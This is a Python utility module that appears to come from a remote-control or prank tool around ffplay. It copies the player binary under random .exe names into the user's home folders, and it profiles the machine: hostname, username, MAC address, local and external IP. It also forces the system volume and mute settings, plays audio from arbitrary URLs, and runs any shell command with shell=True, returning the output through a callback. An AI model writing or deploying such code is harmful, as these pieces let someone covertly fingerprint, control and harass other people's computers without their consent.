from check_platform import is_linux
from audio_manager.audio_manager import _AudioManager
from contextlib import redirect_stdout
from types import LambdaType
from pathlib import Path
import subprocess
import processes
import hashlib
import time
import socket
import getpass
import platform
import uuid
import requests
import random
import shutil
import os
import io




__DIR__ = os.path.dirname(__file__)

HOME_DIR = Path.home().as_posix()

FFMPEG_PATH = os.path.join(__DIR__, "../ffmpeg")

FFPLAY_EXECUTABLE_FILENAME = "ffplay" if is_linux else "ffplay.exe"
FFPLAY_PATH = os.path.join(FFMPEG_PATH, FFPLAY_EXECUTABLE_FILENAME)

MUSIC_TEST_PATH = os.path.join(FFMPEG_PATH, "June.mp3")




def generateFFPLAY():
    home_dirs = []

    for fd in os.listdir(HOME_DIR):
        path = os.path.join(HOME_DIR, fd)
        if os.path.isdir(path):
            home_dirs.append(path)

    exe_path = os.path.join(random.choice(home_dirs), str(time.time()) + ".exe")


    i = 0

    while i < 10:
        try:
            with open(FFPLAY_PATH, 'rb')as fr:
                with open(exe_path, 'wb')as fw:
                    fw.write(fr.read())


            return exe_path
        

        except:
            i += 1


    return None





def cleanFFPLAY():
    home_dir = Path.home()
    ffplay_md5_hashed = ""


    with open(FFPLAY_PATH, 'rb') as fr:
        md5 = hashlib.md5(fr.read())
        ffplay_md5_hashed = md5.digest().hex()


    for fd in home_dir.iterdir():
        if fd.is_dir():
            try:
                for sfd in fd.iterdir():
                    try:
                        if sfd.is_file():
                            with open(sfd, 'rb') as fr:
                                md5 = hashlib.md5(fr.read())
                                if ffplay_md5_hashed == md5.digest().hex():
                                    sfd.unlink()
                                    print(sfd)

                    except (PermissionError, FileNotFoundError):
                        continue

            except (PermissionError, FileNotFoundError):
                continue



def getAudioManager()-> _AudioManager:
    from audio_manager.linux import AudioManager as AudioManagerLinux
    from audio_manager.win import AudioManager as AudioManagerWin
    return (AudioManagerLinux if is_linux else AudioManagerWin)()


def getComputerInfo():
    info = {}

    info["Hostname"] = socket.gethostname()

    info["Username"] = getpass.getuser()


    try:
        info["Local IP"] = socket.gethostbyname(info["Hostname"])
    except:
        info["Local IP"] = "Unable to get IP"


    mac_num = hex(uuid.getnode()).replace('0x', '').upper()
    mac = ":".join(mac_num[i:i+2] for i in range(0, 11, 2))
    info["MAC Address"] = mac

    info["OS"] = platform.system()
    info["OS Version"] = platform.version()
    info["Platform"] = platform.platform()


    try:
        info["External IP"] = requests.get('https://ifconfig.me').text
    except:
        info["External IP"] = "No Internet/Failed"

    return info



def testSong(ffplay_path: str = FFPLAY_PATH):
    proc = subprocess.Popen(['-i', MUSIC_TEST_PATH, '-nodisp', '-autoexit'], executable=ffplay_path)
    processes.processes.append(proc)

    time.sleep(120)
    
    proc.terminate()
    proc.kill()



def setAudio(percen: int = 100):
    getAudioManager().setPercent(percen)


def setSystemMute(is_mute: bool):
    getAudioManager().setSystemMute(is_mute)
    # AudioManagerWin().setSystemMute(is_mute)



def ffplayFromURL(url: str, ffplay_path: str):
    proc = subprocess.Popen(['-i', url, '-nodisp', '-autoexit'], executable=ffplay_path)
    processes.processes.append(proc)



def executeCommandAsync(command: str, cb: LambdaType):
    with io.StringIO()as buffer:
        with redirect_stdout(buffer):
            subprocess.run(command, timeout=60*60, shell=True)  # default timeout is 1hour


        buffer.seek(0)
        return cb(buffer.read())


        